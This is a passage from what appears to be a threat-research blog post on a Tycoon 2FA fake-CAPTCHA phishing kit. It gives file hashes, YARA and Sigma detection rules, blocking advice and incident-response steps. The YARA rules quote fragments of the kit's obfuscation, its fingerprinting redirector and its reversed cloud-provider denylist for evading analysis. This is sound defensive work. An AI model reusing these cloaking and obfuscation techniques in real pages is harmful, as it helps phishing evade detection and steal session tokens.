vendor.js build: b69840dbb1f04a59f97dbd79436270dc   build:b43e09cb43d7fb3f
PDF SHA256       A0EB71B6866654575E3784FD8D9DE31106447762126D40D48EB87D74356A665C
PDF MD5          419D47D7087D11AEAEB4FDE98963BED2
Family           Tycoon 2FA / Storm-1747
```

## Detection

These rules are keyed to the current packer and obfuscation choices, not to the lure art. They will catch domain, key, and skin rotation, but the strings are exact enough that a literal swap on the operator's side, different scrambled tokens, different field names, will need re-keying. Pair them with the Sigma behavioral rules below so you are not single-pointed on the static side.

### YARA, static CAPTCHA page

Keyed to the obfuscation, not the lure art, so it survives the operator swapping domains, keys, and skins.

```yara
rule FakeCaptcha_Cloaker_Kit
{
    meta:
        description = "Fake CAPTCHA cloaking page, Tycoon 2FA delivery"
        author = "Hamza Haroon, NUA Security"
        date = "2026-06-06"
    strings:
        $form   = "\"---mrof---\".slice(3, 7).split(\"\").reverse().join(\"\")"
        $input  = "\"t-u-p-n-i\".split(\"-\").reverse().join(\"\")"
        $hidden = "\"999neddih111\".substring(3, 9)"
        $post   = "[...\"X P O S T Y\"].filter("
        $submit = "['summary','user','box','media','index','task'].map(w=>w[0]).join('')"
        $fn     = "new Function("
        $atob   = "atob("
        $xor    = /\[\s*\w+\s*\]\s*=\s*\w+\[\s*\w+\s*\]\s*\^\s*\w+\[\s*\w+\s*%\s*\w+\.length\s*\]/
        $zone   = "name: \"zone\""
    condition:
        2 of ($form, $input, $hidden, $post, $submit) and $fn and $atob and $xor and $zone
}
```

### YARA, fingerprint redirector

```yara
rule FakeCaptcha_Fingerprint_Redirector
{
    meta:
        description = "Browser fingerprint + WebRTC IP leak redirector (vendor.js)"
        author = "Hamza Haroon, NUA Security"
        date = "2026-06-06"
    strings:
        $u    = "getAttribute(\"data-u\")"
        $an   = "\"analytics\""
        $stun = "stun:stun.l.google.com:19302"
        $dt   = "fn.toString = function"
        $proto= "Array.prototype.includes ="
    condition:
        $u and $stun and ($an or $dt or $proto)
}
```

### YARA, decoded cloaking payload

Keyed per token rather than on the full comma-joined denylist so an operator reorder or single-token swap does not silently break the rule. Two of the kit's tokens are misspelled (`naecolaigtid` and `rentzteh`), so the rule includes both the typo forms shipped by the current builds and the corrected forms an operator might switch to in a future build.

```yara
rule FakeCaptcha_Cloaker_Payload
{
    meta:
        description = "Decoded cloaking layer, ipapi reputation + reversed ASN denylist"
        author = "Hamza Haroon, NUA Security"
        date = "2026-06-06"
    strings:
        $ipapi          = "api.ipapi.is"
        $hide           = "documentElement.style.visibility"
        $rev            = ".split(\"\").reverse().join(\"\")"

        // reversed denylist tokens as shipped by the kit (current builds)
        $t_leaseweb     = "bewesael"
        $t_m247         = "742m"
        $t_digi_typo    = "naecolaigtid"   // operator typo for digitalocean
        $t_linode       = "edonil"
        $t_amazon       = "nozama"
        $t_aws          = "swa"
        $t_ovh          = "hvo"
        $t_hetz_typo    = "rentzteh"       // operator typo for hetzner
        $t_google       = "elgoog"
        $t_microsoft    = "tfosorcim"
        $t_cloudflare   = "eralfduolc"
        $t_cfnet        = "teneralfduolc"
        $t_as13335      = "53331sa"        // Cloudflare AS13335
        $t_akamai       = "iamaka"
        $t_fastly       = "yltsaf"

        // corrected reversals an operator might switch to in a future build
        $t_digi_fixed   = "naecolatigid"
        $t_hetz_fixed   = "renzteh"
    condition:
        ($ipapi and $hide and $rev) and 3 of ($t_*)
}
```

### Sigma, proxy behavioral

The first rule alone is high false positive. Plenty of legitimate sites use ipapi for geolocation. Pair it with a behavioral signal (a page that hides on load, or a CAPTCHA-like host that the user did not navigate to deliberately) before alerting. As written here it is intended as a hunting query, not a blocking trigger.

```yaml
title: Browser IP reputation lookup to api.ipapi.is alongside phishing redirect
logsource:
  category: proxy
detection:
  sel:
    c-uri|contains: 'api.ipapi.is'
    cs-user-agent|contains: ['Chrome','Edg','Firefox']
  condition: sel
level: medium
falsepositives:
  - Legitimate geolocation scripts (very common, this rule is a hunting query)
  - Sites that use ipapi for analytics or content localization
```

The tilde-variant URL pattern below is specific enough that high severity is reasonable, but the regex still matches legitimate URLs that happen to follow the same shape (older WordPress and Apache mod_userdir style `/~username` paths, some CDN cache keys). Either keep it as a hunting query or pair it with a "page that hides on load" or "POST originating from a CAPTCHA host" qualifier in your stack.

```yaml
title: Tycoon 2FA tilda variant endpoint
logsource:
  category: proxy
detection:
  sel:
    c-uri|re: '/[a-z]+~[a-z0-9]{4,8}$'   # e.g. /cyberia~qmanl
  condition: sel
level: high
falsepositives:
  - Legitimate ~username style paths (mod_userdir, older WordPress, some CDNs)
  - Cache keys or shortlinks that use a tilde separator
```

### Blocking

Block the hosts by name, not by IP, since they sit behind Cloudflare. Treat outbound hits on the reputation API and the Google STUN server as behavioral signals when they show up next to a page that hides itself on load. Report `sudrosi.contractors` to ColoCrossing, `dacharo.com` to GCORE, the Cloudflare fronted hosts to Cloudflare abuse, plus the registrars and your national CERT.

## Incident response, Tycoon specifics

Search the whole tenant for the sender, subject, and URL to find everyone who got hit. For anyone who reached the CAPTCHA, reset credentials and, more importantly, revoke active sessions and refresh tokens. With Tycoon this is the step people miss. The kit steals the post-MFA session token, so a password reset alone leaves the attacker sitting on a live, authenticated session. Kill the tokens, force reauthentication, and audit sign in logs and inbox rules on the affected accounts, because AiTM operators love to drop forwarding and hiding rules once they are in. And tell the consulting firm their mailbox is compromised, because that account is the live source of the whole campaign.

## Wrapping up

What sticks with me about this one is the discipline. Whoever runs this kit assumed they would be sandboxed, scanned, and reversed, and they built quiet little doors that open only for the right victim at the right moment. The fake CAPTCHA was never the threat. It was the costume. The real danger was a single one byte request to a throwaway domain, buried under three layers of misdirection meant to keep any analyst from ever reaching it. We reached it anyway, the right way, without letting it run on anything that mattered.

If you are defending a mailbox, assume the next one of these will arrive properly authenticated from someone you trust, will look completely boring, and will work hard to make sure you never see what it really is. Hunt the mechanisms, not the domains. The domains die. The tradecraft does not.

## Appendix

Full untruncated samples and keys: https://gist.github.com/thegr1ffyn/23d7d3c81cc77d3772f9de642c887303

